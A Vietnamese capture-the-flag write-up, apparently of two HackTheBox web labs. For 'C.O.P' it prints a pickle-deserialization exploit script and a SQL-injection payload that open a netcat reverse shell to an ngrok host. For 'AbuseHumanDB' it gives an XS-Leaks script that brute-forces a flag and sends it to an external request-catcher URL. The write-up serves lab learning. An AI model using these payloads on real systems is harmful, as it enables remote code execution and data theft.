# C.O.P

### Build Dockerfile

![image](https://user-images.githubusercontent.com/86275419/227902491-e1487d10-5df1-40c5-8d95-adf611ea9454.png)

* Note: lần đầu build nếu fail thì ae build lại là ok nhé. Web mặc định chạy trên port 1337

![image](https://user-images.githubusercontent.com/86275419/227897018-6d2cc8ac-ed92-49ce-a8b0-03f2e6682081.png)

Challenge cho ta một trang web bán hàng có chức năng xem sản phẩm

## Phân tích source code

Web được xây dựng bằng ngôn ngữ Python, do kiến thức code web bằng python không có nhiều nên trong bài này chỗ nào không hiểu mình ném hết lên chatGPT là ra. EX:

![image](https://user-images.githubusercontent.com/86275419/227953728-aa220781-b0d8-4afb-b86f-2bc532848f09.png)

Sau khi review source code thì mình cần chú ý vào một số đoạn sau:

- File `database.py`:

![image](https://user-images.githubusercontent.com/86275419/227924263-7af0384b-b1ae-4af6-bc81-0d66a665fb79.png)

Đầu tiên khi chạy app thì nó sẽ tạo database sqlite3 và lưu 4 đối tượng Item được serialize bằng hàm `pickle.dumps(x)` 

- File `routes.py`

![image](https://user-images.githubusercontent.com/86275419/227957772-d58b5e79-e5fb-4f6c-9e9e-8151a122730e.png)

Khi vào trang chủ (`/`) thì nó sẽ gọi hàm `index()`. Hàm này sẽ render giao diện từ file `index.html` và gán biến `products` (chứa các đối tượng Item được lưu vào database khi khởi tạo app) vào `index.html`

Khi vào từng sản phẩm (`/view/<product_id>`) thì nó sẽ gọi hàm `product_details(product_id)`. Hàm này sẽ render giao diện từ file `index.html` và gán biến `product` (chứa đối tượng Item với product_id tương ứng) vào `index.html`

- File `models.py`

![image](https://user-images.githubusercontent.com/86275419/227979925-0630961b-c067-492e-aa3d-cc0c07685421.png)

File này chứa các hàm có chức năng truy vấn CSDL

+ Hàm `select_by_id(product_id)` được gọi bởi hàm `product_details(product_id)` bên trên, hàm này có điểm cần lưu ý là `product_id` được gán trực tiếp vào câu truy vấn mà không có bất kì hàm filter nào cả => có thể tấn công SQLi. Một lưu ý nữa là hàm chỉ nhận một câu truy vấn `one=True`, có nghĩa là nếu có thể Injection thì ta chỉ có thể inject các Syntax nối thêm vào câu lệnh gốc để tạo thành 1 câu lệnh SQL duy nhất
+ Hàm `all_products()` được gọi bởi hàm `index()` bên trên

- File `index.html`:

![image](https://user-images.githubusercontent.com/86275419/227983616-291b6ac7-4ad7-4f3e-9f0f-f56c7ecd845f.png)

- Ta sẽ chú ý vào đoạn code Jinja
+ Ở đây sẽ có một vòng lặp lấy từng phần tử của `products` và gán vào `product`, `product` sẽ được deserialize bởi hàm pickle (bên dưới) và gán vào biến item
+ Thân vòng lặp là các thẻ để in ra nội dung của đối tượng được deserialize (item)

- File `item.html`:

![image](https://user-images.githubusercontent.com/86275419/227990161-e05034ef-23b9-4b7d-9551-3a4844bbd82b.png)

File có chức năng hiển thị chi tiết 1 product

Nội dung tương tự file `index.html` nhưng ở đây sẽ chỉ có 1 phần tử `product`

- File `app.py`:

![image](https://user-images.githubusercontent.com/86275419/227994551-4c3db590-58b4-4343-8abe-be7f7a11b32d.png)

Ta sẽ chú ý vào hàm `pickle_loads(s)`
+ Hàm này sẽ chịu trách nhiệm deserialize, ở Task 3 mình đã được làm một bài về Serialization nên có thể nhận định đây khả năng cao là lỗ hổng của bài này
+ Không giống như bài Phineas, ở bài này hàm `pickle_loads(s)` ta sẽ không thể gọi trực tiếp, mà nó chỉ được gọi khi render giao diện, được gọi trong file `index.html` và `item.html`

=> Sau khi phân tích source code thì mình có thể nhận định được rằng bài này phải RCE mới đọc được Flag (vì trong code không hề có chức năng nào đọc file flag) và khả năng cao đang bị dính lỗ hổng Insecure Deserialization, bây giờ ta sẽ phải tìm cách cho payload đi qua hàm `pickle_loads(s)`, từ đó có thể RCE
+ Ngoài Insecure Deserialization thì bài này còn có lỗi SQL Injection và mình cũng nghĩ đến Blind SQLi vì database đang sử dụng Sqlite3 do task2 mình cũng đã làm và server phải có PHP. Nhưng bài này server đang chạy web bằng Python nên khả năng xảy ra lỗi này là không cao

## Solution
- Hàm `pickle_loads(s)` được call trong file `index.html` và `item.html`, tại đây dữ liệu truyền vào hàm để deserialize là các phần tử được truy vấn ra từ database. Trong hai file này thì ta sẽ chú ý đặc biệt vào file `item.html` vì:
+ Ta có thể tấn công SQL injection vào đây, từ đó có thể gây ra cho câu truy vấn trả về dữ liệu mà ta có thể kiểm soát (bằng cách sử dụng Union Select, các cách injection để tạo 2 câu truy vấn khác nhau sẽ bị chặn vì lý do như bên trên mình có giải thích)

- Ta sẽ quay lại câu truy vấn (models.py):

```
 def select_by_id(product_id):
     return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

+ `product_id` sẽ được lấy trên URL khi ta view chi tiết từng sản phẩm (chi tiết trong file routes.py), đây sẽ là điểm để ta injection payload

-> Ở bài lab này mình sẽ inject vào một đoạn payload chứa reverse shell đã được serialize (giống như Task 3 mình có làm) vào `product_id` trên URL để làm cho câu truy vấn SQL trả về payload của mình, từ đó khi render giao diện trong file `item.html` payload sẽ được deserialize và ta có thể RCE. Do bài này mình không thể truyền trực tiếp payload vào như Task 3 nên phải custom lại code, và từ đây hậu quả của việc không hiểu rõ về lỗ hổng này bắt đầu:

```
import pickle
import base64
import requests

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

command = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 14769 >/tmp/f' # Reverse Shell Payload Change IP/PORT

payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()  # Crafting Payload

payload = f"' UNION SELECT '{payload}' --"

payload = requests.utils.requote_uri(payload)

print(payload)

```
Payload (Python 3.11.1):

`'%20UNION%20SELECT%20'gASVcAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`

Result:

![image](https://user-images.githubusercontent.com/86275419/228025771-66aaaac1-4e36-4a26-a0f0-64747383dcea.png)

-> Fail sau nhiều lần thử sửa payload các thử mình vẫn fail mà không biết nguyên nhân lỗi từ đâu. Sau đó mình có tham khảo các write up làm theo cũng vẫn fail, lúc này mình tưởng rằng python đã update version mới và fix lỗi này nên không khai thác được nữa mà quên mất là khi build Docker thì version Python là cố định. Để chắc chắn rằng có thể do máy mình lỗi hoặc lab đang lỗi thì mình có nhờ một người ae test thử lại và người ae mình đã RCE được thành công với cách giống hệt mình đã làm bên trên. Lúc này thì mình vẫn chưa phát hiện ra vấn đề đang ở đâu, sau một lúc nghiên cứu lại thì bằng một cách thần kì nào đấy mình lên [web ide python online](https://www.online-python.com/) gen lại payload thử lại và thành công, lúc này mình đã lấy 2 payload so sánh với với nhau và phát hiện ra 2 payload cùng một code nhưng kết quả laị khác nhau, vậy thì chỉ có thể là do version:

IDE Online:

![image](https://user-images.githubusercontent.com/86275419/228031083-12ed2afb-b68b-43e1-a43d-34072193f293.png)

IDE myPC:

![image](https://user-images.githubusercontent.com/86275419/228031388-ddc9a95c-7531-41bd-805b-d591e072e756.png)

=> Python trên máy mình đang chạy version 3.11 nên lỗ hổng đã bị fix và không thể khai thác bằng cách trên, từ đoạn này mọi payload mình gen ra sẽ từ IDE online đang chạy Python version 3.8

Gen lại payload với đoạn code bên trên:

`'%20UNION%20SELECT%20'gASVcwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`

![image](https://user-images.githubusercontent.com/86275419/228033869-735f47bf-d0ed-4b0c-ba3f-cce5ad750f28.png)

Result:

![image](https://user-images.githubusercontent.com/86275419/228033072-0e68bff4-2e5a-4470-ad3d-2b0d79d5eb9f.png)

Exploit thành công


# AbuseHumanDB

Khi truy cập vào trang web thì ta sẽ được một trang có 2 chức năng chính là `Report Abusive Content By Humans`:

![image](https://user-images.githubusercontent.com/86275419/228646954-ac9e50ba-aede-4b8b-9d83-0a6368ccff46.png)

![image](https://user-images.githubusercontent.com/86275419/228647872-0961a578-ce6a-490a-94ee-a3bc73bea7a9.png)

và `Search Query`:

![image](https://user-images.githubusercontent.com/86275419/228647101-0ad5d0a3-7e09-4bc5-b3ac-005cd67dca21.png)

![image](https://user-images.githubusercontent.com/86275419/228647996-2dfc2a71-20ab-4a45-a71b-2bb9cd1af34f.png)

### Sau khi thử sử dụng trang web xong thì mình đi phân tích source code để tìm lỗ hổng

![image](https://user-images.githubusercontent.com/86275419/228648381-fc1218f9-edb2-4856-9936-b1375e9740b9.png)

Đây là một trang web được code bằng NodeJS, CSDL là sqlite

Đầu tiên khi vào web sẽ tạo database (file database.js):

![image](https://user-images.githubusercontent.com/86275419/228650383-55f6ba09-40fd-42a7-a419-2dfe83696188.png)

Ta thấy rằng Flag sẽ nằm ở database, và khác với các dữ liệu khác, cột `approved` của Flag sẽ là `0`

Ta tiếp tục xem file database:

![image](https://user-images.githubusercontent.com/86275419/228651246-e8a8932e-7838-4486-b49d-0794a25b1f8e.png)

Đây là các hàm để lấy dữ liệu ra trong database, ta thấy rằng tất cả truy vấn đều sử dụng statement nên việc tấn công SQL Injection vào đây là không thể

+ Để ý thêm ở các hàm lấy dữ liệu thì tham số (approved) mặc định là 1, mà flag của ta approved=0, có nghĩa là để lấy được flag thì ta cần truyền vào đối số là `0`

Ta sẽ đi tìm xem hàm nào gọi truy vấn CSDL, file routes\index.js:

- Trong file này có 2 hàm gọi truy vấn database:

![image](https://user-images.githubusercontent.com/86275419/228653070-e759ba9f-5cff-498a-90ec-a40768e8dfba.png)

Khi ta truy cập vào trang chủ của web thì hàm trên sẽ được gọi, hàm này khi gọi truy vấn database và truyền vào một đối số là một biến `isLocalhost(req)` (tương ứng là approved) để truy vấn toàn bộ report trong database có `isLocalhost(req)` (ta sẽ phân tích bên dưới) tương ứng là 0 (only flag) hoặc 1 (Tất cả report trừ Flag) 

Khi ta sử dụng chức năng Search Query thì nó sẽ gọi hàm bên dưới:

![image](https://user-images.githubusercontent.com/86275419/228655257-6e4c088e-ab27-4090-86be-7934d9862627.png)

+ Hàm này khi truy vấn database sẽ truyền vào 2 tham số là `query` và `isLocalhost(req)`. Biến query sẽ lấy giá trị từ parameter `q` (ta truyền vào) sau đó gán thêm ký tự `%` vào sau giá trị mà ta truyền vào (mục đính để dấu `%` sẽ match với tất cả các ký tự đằng sau giá trị ta truyền vào khi truy vấn db). Dưới đây là request khi ta Search Query:

![image](https://user-images.githubusercontent.com/86275419/228657099-d42dedcc-6a7e-41a6-a87b-9e65e4843a99.png)

=> Ta thấy rằng ở hai hàm trên, điều kiện để ta có thể lấy được Flag là `isLocalhost(req)=0`, sẽ sẽ đi xem biến `isLocalhost(req)`:

![image](https://user-images.githubusercontent.com/86275419/228658448-802d3874-9fa5-4739-8a44-1904052477ec.png)

Ta có thể thấy rằng để `isLocalhost(req)=0` thì request phải được thực hiện từ ip `127.0.0.1:1337`(localhost với port 1337), còn nếu truy vấn từ máy bên ngoài vào thì `isLocalhost(req)=1` -> `approved=1` -> Không lấy được Flag. Và theo tìm hiểu của mình thì việc bypass ở đây là không thực hiện được

=> Vậy bây giờ ta cần phải tìm cách tạo request từ chính localhost của trang web để lấy Flag, đến đây mình nghĩ đến lỗi SSRF

Ta sẽ đi tìm thêm một số thông tin khác trong File code để tìm solution:

Ở trong routes/index.js ta có còn một hàm sau:

![image](https://user-images.githubusercontent.com/86275419/228660952-84fe7078-3e27-4a4a-8321-919c93955dea.png)

Hàm này là hàm xử lý chức năng `Report Abusive Content By Humans` 
+ Hàm này sẽ lấy url mà ta truyền vào, sau đó đưa vào một con bot (hàm visitPage) để truy cập tới url đó. Dưới đây là hàm visitPage()(file bot.js):

![image](https://user-images.githubusercontent.com/86275419/228663923-4a3cc87d-d11c-4377-b8d6-d0bed5a84016.png)

Một đống code JS bên trên mình cũng không hiểu lắm, nhưng sau khi search thì nhìn chung nó sẽ visit tới cái url của mình truyền vào 

Sau một thời gian đọc code thì mình có vector tấn công như sau: đầu tiên mình sẽ gửi url (localhost) tới con bot để nó truy cập vào url đó và vào trang chủ, lúc này `isLocalhost(req)=0` và trả về cho con bot Flag. Nhưng ở vector này mình đang gặp vấn đề là làm sao để lấy Flag từ con bot về mình :v

Sau một hồi suy nghĩ gaf quá không ra được kỹ thuật nào có thể áp dụng vào đây nên đành lên mạng xem sol để tìm hint làm tiếp, và mình tìm được keyword `XS-Leaks`

![image](https://user-images.githubusercontent.com/86275419/228668617-6bda2212-e928-4759-b458-3f8802246936.png)

Reading:

https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html

https://xsleaks.dev/

https://book.hacktricks.xyz/pentesting-web/xs-search

![image](https://user-images.githubusercontent.com/86275419/228676870-a991ffc7-45d1-4781-b342-0b5ed9cc5b50.png)

Sau khi đọc một số bài viết thì mình hiểu nôm na rằng lỗ hổng này cho phép hacker sử dụng các thông tin được trao đổi giữa các trang web tưởng chừng như các thông tin đó là vô nghĩa, nhưng từ những thông tin đó hacker có thể sử dụng để suy luận ra những thông tin nhạy cảm

Ta sẽ quay lại web để phân tích tiếp code xem chỗ nào có thể áp dụng XS-Leaks

![image](https://user-images.githubusercontent.com/86275419/228677580-654a4e37-f4b0-44b7-8027-010fbc0964c3.png)

Chức năng Search, khi ta truy vấn db mà không có bản ghi nào trả về thì nó sẽ response lỗi 404, còn nếu có sẽ là 200
+ Ở đây ta để ý trường query lúc nãy mình có giải thích ký tự `%`, bây giờ ta sẽ brute-force từng ký tự của Flag, nếu ký tự đó nằm trong Flag sẽ response 200 còn không thì sẽ response status 404 (error)

Lợi dụng điều này, khi ta sử dụng XS-Leaks nó sẽ sử dụng các Error Events (.onerror(), .onload()) để thể hiện cho chúng ta thấy khi nó request tới một url có xảy ra lỗi (404) hay không (200)

Vector: ta sẽ tạo một trang web chứa một đoạn script thực hiện XS-Leaks và có chức năng gửi lại kết quả cho mình -> gửi link chứa trang web này cho con bot -> bot truy cập link -> script thực hiện trên con bot với ip localhost (`isLocalhost(req)=0` -> `approved=0`) -> bot gửi request và brute-force từng ký tự Flag tại chức năng `Search Query` -> Sau khi brute-force xong, bot gửi lại flag cho mình

Script 

```
<html>
<script>
var ip = '127.0.0.1:1337'; // Only IP
var myWeb = 'https://duypt.requestcatcher.com'; //URL để lấy flag
var flag = 'HTB';
var chars = '!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
var url = `http://${ip}/api/entries/search?q=`

async function getPartialFlag(char){ //Hàm thực hiện gửi request tới url để xem có lỗi hay không
 return new Promise((resolve, reject)=>{
 const script = document.createElement("script");
 script.src = url+encodeURIComponent(flag+char);
 script.onload = () => char==='}' ? reject(char):resolve(char); //Nếu thành công (200) sẽ thực hiện
 script.onerror = () => reject(char); //Nếu không thành công (404) sẽ thực hiện
 document.head.appendChild(script);
 });
}
async function getFlag(chars) {  //Hàm thực hiện brute-force flag
 var b = false; 
 for(var i=0; i < chars.length; i++){
    await getPartialFlag(chars[i]).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } ); //Thực hiện ghép flag, nếu là ký tự cuối cùng ('}') gán b=True để break
    if(b) break;
}
 fetch(`${myWeb}/flag=${flag}`, {method:'get'}); // Thực hiện trả về kết quả cho hacker 
};
getFlag(chars);
</script>
<html>

```

Mọi người cần built một web để máy bên HTB có thể truy cập vào được, ở đây mình dùng apache + ngrok

Thực hiện gửi link web của mình vào chức năng `Report Abusive Content By Humans` 

![image](https://user-images.githubusercontent.com/86275419/228696618-1cfcbab7-f971-4292-98a7-c5eb356498a6.png)

Giờ ta chỉ ngồi đợi Flag về thôi
